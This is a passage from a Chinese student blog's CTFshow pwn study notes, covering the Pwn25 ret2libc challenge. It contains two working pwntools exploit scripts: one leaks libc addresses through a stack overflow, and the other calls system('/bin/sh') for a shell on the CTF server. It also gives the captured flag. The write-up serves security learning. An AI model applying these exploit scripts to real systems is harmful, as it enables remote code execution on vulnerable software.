+<h4 id="泄露地址脚本"><a href="#泄露地址脚本" class="headerlink" title="泄露地址脚本"></a>泄露地址脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28303</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload: 垃圾 + 函数 + 返回地址 + 参数</span></span><br><span class="line">payload1 =  <span class="string">b&#x27;A&#x27;</span> * offset + p32(puts_plt) + p32(main_addr) + p32(read_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位 Linux 地址常以 f7 开头，精准切片并解包</span></span><br><span class="line">read_real_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Leak read addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_real_addr)&#125;</span>&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="完整攻击-EXP"><a href="#完整攻击-EXP" class="headerlink" title="完整攻击 EXP"></a>完整攻击 EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28303</span>) </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>) </span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">offset = <span class="number">140</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 阶段一：泄露坐标</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">leak_write = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阶段二：计算基址</span></span><br><span class="line">libc_obj = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, leak_write)</span><br><span class="line">libc_base = leak_write - libc_obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc_obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc_obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阶段三：绝杀</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/blog4(ctfshow_pwn)/image2.png" alt="Glibc"><br>通过 <code>strings ./pwn | grep Ubuntu</code> 确定 <code>GCC: (Ubuntu 7.5.0-3ubuntu1~18.04)</code>。</p>
+<ul>
+<li><p>18.04 对应 GLIBC 2.27。</p>
+</li>
+<li><p>审视选项：排除 0-3 (2.19), 4 (非 Ubuntu), 6, 9 (2.17)。</p>
+</li>
+<li><p><strong>输入 5</strong> 提取 flag。</p>
+</li>
+</ul>
+<p><strong>Flag</strong>: <code>ctfshow{b513b07d-d063-400c-8429-64451fa11b8b}</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Colin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/04/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20CTFshow_Pwn%E7%9F%A5%E8%AF%86%E7%B2%BE%E7%82%BC(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD)/">http://example.com/2026/04/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20CTFshow_Pwn%E7%9F%A5%E8%AF%86%E7%B2%BE%E7%82%BC(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Colin</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post-share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/256901064?s=400&amp;u=57ab83cada0314c38a33d0615d653723b26b68d3&amp;v=4" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4%E7%9A%84Ret2libc%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="学习笔记-绕过 NX 保护的 Ret2libc 漏洞利用（Pwn25）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">学习笔记-绕过 NX 保护的 Ret2libc 漏洞利用（Pwn25）</div></div><div class="info-2"><div class="info-item-1">思路（题目链接 https://ctf.show/challenges#pwn25 ）本程序的保护机制开启了 NX (No-eXecute) 保护，这意味着栈上的数据不具备可执行权限，传统的直接注入 Shellcode 方法失效。 为了绕过 NX 保护，我们可以利用程序自带的函数库（动态链接库）进行 Ret2libc 攻击。核心逻辑为：先通过 IDA 静态分析找到栈溢出漏洞点，再通过 ROP 链泄露某一已解析函数的真实内存地址。利用 LibcSearcher 检索 libc 库中相应的偏移量，推算出 system 函数和 /bin/sh 字符串的绝对地址，最终构造 Payload 劫持控制流拿到 Shell。  解题过程一、 静态分析与漏洞定位首先checksec检查程序在进行动态调试前，首先使用 IDA Pro (32-bit) 载入附件程序进行静态分析。通过伪代码可以发现，程序在读取用户输入时，使用了未限制长度的危险函数（read） 读取的长度远大于分配给 buf 缓冲区的空间，这就构成了典型的栈缓冲区溢出漏洞。进一步观察 IDA 提取的栈帧结构（如图 3），buf 变量距离...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/17/Hello%20World%20%E2%80%93%20%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA%E4%B8%8E%E8%BF%AD%E4%BB%A3%E8%AE%B0%E5%BD%95/" title="Hello World – 博客创建与迭代记录（持续更新中）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-17</div><div class="info-item-2">Hello World – 博客创建与迭代记录（持续更新中）</div></div><div class="info-2"><div class="info-item-1">前言2026年3月14日，对我是不平凡的一天：这天参加了软件系统安全赛的初赛，打出一道隐写题，有道流量题差一分钟交Flag，痛失现场赛资格，赛后耿耿于怀，翻遍各大论坛找其他师傅的wp核对思路，未果，然后突发奇想：  “此时此刻，会不会也有一个人，也在埋头寻找那道杂项的wp呢”  正好wp截止时间已到，我就抱着试一试的心态，把wp上传到了CSDN上，反响意外的好，还被纳入了“最佳新人榜”（虽然含金量约等于“再来一瓶”）这对我而言是莫大的鼓舞。可CSDN漫天的广告弹屏，莫名的删评审核，以及逆天的会员推送，无不在劝退着我，而本人撰写博客的热情刚被激起，又怎能善罢甘休，这时，我突然想起Himekawa学长分享过的个人博客，一个想法闪过心头：——我也要创建独立博客! 说干就干，我以学长的博客为榜样，大致了解了Hexo和Butterfly的相关信息，经过广泛搜集教程和AI的指引，终于一砖一瓦地，搭好了这个小站，当 https://c01in-0.github.io/（旧域名）呈现在我的浏览器时，我突然想起七岁第一次拼成乐高的那个下午，当时的喜悦和成就感是何等强烈，韶华飞逝，岁月荏苒，如今展现...</div></div></div></a><a class="pagination-related" href="/2026/04/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4%E7%9A%84Ret2libc%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="学习笔记-绕过 NX 保护的 Ret2libc 漏洞利用（Pwn25）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-05</div><div class="info-item-2">学习笔记-绕过 NX 保护的 Ret2libc 漏洞利用（Pwn25）</div></div><div class="info-2"><div class="info-item-1">思路（题目链接 https://ctf.show/challenges#pwn25 ）本程序的保护机制开启了 NX (No-eXecute) 保护，这意味着栈上的数据不具备可执行权限，传统的直接注入 Shellcode 方法失效。 为了绕过 NX 保护，我们可以利用程序自带的函数库（动态链接库）进行 Ret2libc 攻击。核心逻辑为：先通过 IDA 静态分析找到栈溢出漏洞点，再通过 ROP 链泄露某一已解析函数的真实内存地址。利用 LibcSearcher 检索 libc 库中相应的偏移量，推算出 system 函数和 /bin/sh 字符串的绝对地址，最终构造 Payload 劫持控制流拿到 Shell。  解题过程一、 静态分析与漏洞定位首先checksec检查程序在进行动态调试前，首先使用 IDA Pro (32-bit) 载入附件程序进行静态分析。通过伪代码可以发现，程序在读取用户输入时，使用了未限制长度的危险函数（read） 读取的长度远大于分配给 buf 缓冲区的空间，这就构成了典型的栈缓冲区溢出漏洞。进一步观察 IDA 提取的栈帧结构（如图 3），buf 变量距离...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/256901064?s=400&amp;u=57ab83cada0314c38a33d0615d653723b26b68d3&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Colin</div><div class="author-info-description">大一信安小登，misc和pwn兼修，立志成为网安糕手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C01in-0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/C01in-0" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:C01in@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Colin{WelC0me_T0_my_b1og}</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn5-12%E2%80%94%E2%80%94%E8%AE%A1%E7%BB%84%E5%9F%BA%E7%A1%80%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">Pwn5-12——计组基础：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU-%E7%9A%84%E8%B4%B4%E8%BA%AB%E5%8F%A3%E8%A2%8B%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">1. 寄存器（CPU 的贴身口袋）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F%EF%BC%88%E6%89%BE%E4%B8%9C%E8%A5%BF%E7%9A%84%E5%A5%97%E8%B7%AF%EF%BC%89"><span class="toc-number">2.1.2.</span> <span class="toc-text">2. 寻址方式（找东西的套路）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%88int-0x80-%E5%8A%9E%E4%BA%8B%E5%A4%A7%E5%8E%85%EF%BC%89"><span class="toc-number">2.1.3.</span> <span class="toc-text">3. 系统调用（int 0x80 办事大厅）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn13-16-%E2%80%94%E2%80%94gcc%E7%BC%96%E8%AF%91%E7%9A%84%E5%88%9D%E6%AD%A5%E8%BF%90%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">Pwn13-16 ——gcc编译的初步运用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn17%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">Pwn17——命令拼接注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn18-%E2%80%94%E2%80%94-%E5%92%8C-%E7%9A%84%E8%BE%A8%E6%9E%90"><span class="toc-number">2.4.</span> <span class="toc-text">pwn18 —— &gt;&gt; 和 &gt; 的辨析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn19-%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.5.</span> <span class="toc-text">Pwn19 ——文件描述符与重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn20-22-%E2%80%94%E2%80%94RELRO%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8EGOT%E8%A1%A8"><span class="toc-number">2.6.</span> <span class="toc-text">Pwn20-22 ——RELRO保护机制与GOT表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn23%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E4%B8%8ESUID%E6%9D%83%E9%99%90"><span class="toc-number">2.7.</span> <span class="toc-text">Pwn23——命令行参数注入与SUID权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn24-%E2%80%94%E2%80%94-pwntools-%E5%88%9D%E6%AD%A5%E5%88%A9%E7%94%A8%EF%BC%88shellcraft%EF%BC%89"><span class="toc-number">2.8.</span> <span class="toc-text">Pwn24 —— pwntools 初步利用（shellcraft）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN25%E2%80%94%E2%80%94Ret2libc%E5%88%9D%E6%AD%A5%E5%88%A9%E7%94%A8"><span class="toc-number">2.9.</span> <span class="toc-text">PWN25——Ret2libc初步利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%81%8F%E7%A7%BB%E5%80%BC"><span class="toc-number">2.9.1.</span> <span class="toc-text">获取偏移值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80%E8%84%9A%E6%9C%AC"><span class="toc-number">2.9.2.</span> <span class="toc-text">泄露地址脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB-EXP"><span class="toc-number">2.9.3.</span> <span class="toc-text">完整攻击 EXP</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20CTFshow_Pwn%E7%9F%A5%E8%AF%86%E7%B2%BE%E7%82%BC(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD)/" title="学习笔记 - CTFshow_Pwn知识精炼">学习笔记 - CTFshow_Pwn知识精炼</a><time datetime="2026-04-12T11:15:00.000Z" title="发表于 2026-04-12 19:15:00">2026-04-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4%E7%9A%84Ret2libc%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="学习笔记-绕过 NX 保护的 Ret2libc 漏洞利用（Pwn25）">学习笔记-绕过 NX 保护的 Ret2libc 漏洞利用（Pwn25）</a><time datetime="2026-04-05T02:00:00.000Z" title="发表于 2026-04-05 10:00:00">2026-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/17/Hello%20World%20%E2%80%93%20%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA%E4%B8%8E%E8%BF%AD%E4%BB%A3%E8%AE%B0%E5%BD%95/" title="Hello World – 博客创建与迭代记录（持续更新中）">Hello World – 博客创建与迭代记录（持续更新中）</a><time datetime="2026-03-17T13:30:00.000Z" title="发表于 2026-03-17 21:30:00">2026-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/15/%E7%AB%9E%E8%B5%9Bwp-2026%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9BMISC/" title="竞赛WP - 2026软件系统安全赛初赛 MISC">竞赛WP - 2026软件系统安全赛初赛 MISC</a><time datetime="2026-03-15T14:00:00.000Z" title="发表于 2026-03-15 22:00:00">2026-03-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/images/littleblogwallpaper.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Colin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      false
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
